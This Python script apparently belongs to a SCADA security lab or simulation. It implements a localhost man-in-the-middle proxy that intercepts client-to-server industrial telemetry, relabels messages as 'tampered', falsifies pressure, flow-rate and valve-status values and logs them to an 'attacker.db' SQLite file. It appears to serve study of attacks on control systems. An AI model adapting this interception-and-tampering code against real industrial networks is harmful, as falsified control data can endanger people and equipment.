import socket
import threading
import json
import random


def store_data(data):
    import sqlite3
    # Connecting to sqlite
    conn = sqlite3.connect('attacker.db')
    data = json.loads(data)
    print(data.get('Pressure Value'))
    # Creating a cursor object using the
    # cursor() method
    cursor = conn.cursor()

    # Creating table
    # table = """CREATE TABLE ScadaNetwork(
    # HostName VARCHAR(255),
    # IP VARCHAR(255),
    # PressureValue VARCHAR(255),
    # Temperature VARCHAR(255),
    # FlowRate VARCHAR(255),
    # SwitchRate VARCHAR(255),
    # ValveStatus VARCHAR(255),
    # PumpStatus VARCHAR(255),
    # FlowIndicator VARCHAR(255),
    # status VARCHAR(255)
    # );"""
    # try:
    #     cursor.execute(table)
    # except Exception as e:
    #     print(e)

    # Queries to INSERT records.
    # cursor.execute(f"INSERT INTO ScadaNetwork(HostName,IP,PressureValue,Temperature,FlowRate,SwitchRate,ValveStatus,PumpStatus,FlowIndicator,status) VALUES ({data.get('Host Name')},{data.get('IP')},{data.get('Pressure Value')},{data.get('Temperature')},{data.get('Flow Rate')},{data.get('Switch Rate')},{data.get('Valve Status')},{data.get('Pump Status')},{data.get('Flow Indicator')},{data.get('status')})")
    status = data.get('status')
    if status == 'tampered':
        data.update({'FlowRate': f"{random.randint(1500, 4000)} psi"})
        data.update({'PressureValue': f"{random.randint(10, 150)} bar"})
        data.update({'ValveStatus': f"{random.choice(['open', 'close', 'high'])} "})
    columns = ', '.join(data.keys())  # Get column names from dict keys
    placeholders = ', '.join(['?'] * len(data))  # Create placeholders (?, ?, ?)
    values = tuple(data.values())  # Get the values to insert

    # Prepare the SQL statement with placeholders
    sql = f"INSERT INTO ScadaNetwork ({columns}) VALUES ({placeholders})"

    # Execute the SQL statement
    cursor.execute(sql, values)
    conn.commit()
    # Display data inserted
    print("Data Inserted in the table: ")
    data = cursor.execute('''SELECT * FROM ScadaNetwork''')
    for row in data:
        print(row)

        # Commit your changes in the database
    conn.commit()

    # Closing the connection
    conn.close()


def handle_client(client_socket, server_socket):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        print(f"Attacker intercepted: {data.decode()}")

        # Modify the data (manipulate the message)
        modified_data = data.decode().replace("Normal", "tampered")
        print(f"Attacker forwarding: {modified_data} and type is {type(modified_data)}")
        store_data(modified_data)
        # Forward the modified message to the real server
        server_socket.sendall(modified_data.encode())


def attacker():
    while True:
        # Set up attacker's server to accept connections from client
        attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker_socket.bind(('localhost', 54321))
        attacker_socket.listen(1)
        print("Attacker is listening for client...")

        client_socket, client_addr = attacker_socket.accept()
        print(f"Attacker connected to client: {client_addr}")

        # Connect to the real SCADA server
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect(('localhost', 12345))

        # Start intercepting
        client_handler = threading.Thread(target=handle_client, args=(client_socket, server_socket))
        client_handler.start()


if __name__ == "__main__":
    attacker()
